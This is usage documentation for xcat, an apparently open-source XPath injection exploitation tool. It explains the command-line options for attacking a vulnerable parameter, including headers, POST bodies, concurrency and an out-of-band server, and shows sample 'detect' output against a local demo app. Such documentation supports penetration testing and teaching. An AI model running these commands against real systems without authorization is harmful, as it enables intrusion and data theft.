# Common options

All commands except `ip` take the same arguments. These describe the attack you are making, 
and allows xcat to explore it and work out what features it can use.

At _minimum_ you need to supply:

- A URL to attack (`url`)
- A target parameter which is vulnerable to XPath injection (`target_parameter`)
- A value for this parameter, and optionally others if required (`parameters`)
- A string or a status code that is present in the response if the condition is True (`--true-string` and `--true-code`)

For example, to attack the [example vulnerable application](https://github.com/orf/xcat_app) you would use:

`xcat run http://localhost:4567/ query query=Rogue --true-string=Lawyer` 

This instructs `xcat` that:

- The vulnerable URL is `http://localhost:4567/`
- The vulnerable parameter is `query`
- The parameters to pass to the URL are `query=Rogue`
- The true condition is `Lawyer` being present in the response

## Additional options

#### `--headers`

This argument can be used to send custom headers, including cookies. It should be a file path to a plain text 
file containing lines in the following format:

```text
Header-Name: header-value
```

**Example:** `xcat run ... --headers=my-header-file.txt`

#### `--body`

This argument is a path to a file containing a request body to send. This is helpful if you are exploiting a 
POST request that has a vulnerable URL parameter, but also require a POST body to be sent. The file contents 
are sent as-is.

**Example:** `xcat run ... --headers=my-request-body.txt`

#### `--encode`

XCat currently supports manipulating either URL or form parameters. This allows you to switch between 
sending the exploit payload via the POST body or URL arguments.

**Example:** `xcat run ... --encode=form`

#### `--fast`

When this flag is present then XCat will only retrieve the first 15 characters of strings. This can drastically speed
up retrieval in documents that contain very large strings.

**Example:** `xcat run ... --fast`

#### `--concurrency`

This parameter limits the number of concurrent connections xcat can make. Setting it too low will slow down 
exploitation, but can reduce the load on the target server.

**Example:** `xcat run ... --concurrency=10`

#### `--enable/--disable`

XCat attempts to intelligently detect what features the target server supports and uses these to speed up 
retrieval. These flags let you force enable or disable these features.

**Example:** `xcat run ... --enable=substring-search`

#### `--oob`

Enables the `oob` server. For more info see [the oob server documentation.](oob.md)

**Example:** `xcat run ... --oob=$EXTERNAL_IP:$EXTERNAL_PORT`

# Detect

This command will print out what injection XCat has detected, as well as a list of features and their status. You 
can use this to quickly explore an injection and different parameter values before commencing an attack.

```shell
$ xcat detect http://localhost:4567/ query query=Rogue --true-string=Lawyer
function call - last string parameter - single quote
 - Example: /lib/something[function(?)]
Detected features:
 - xpath-2: True
 - xpath-3: False
 - xpath-3.1: False
 - normalize-space: True
 - substring-search: True
 - codepoint-search: True
 - environment-variables: False
 - document-uri: True
 - base-uri: True
 - current-datetime: True
 - unparsed-text: False
 - doc-function: True
 - linux: False
 - expath-file: False
 - saxon: False
 - oob-http: False
 - oob-entity-injection: False
``` 
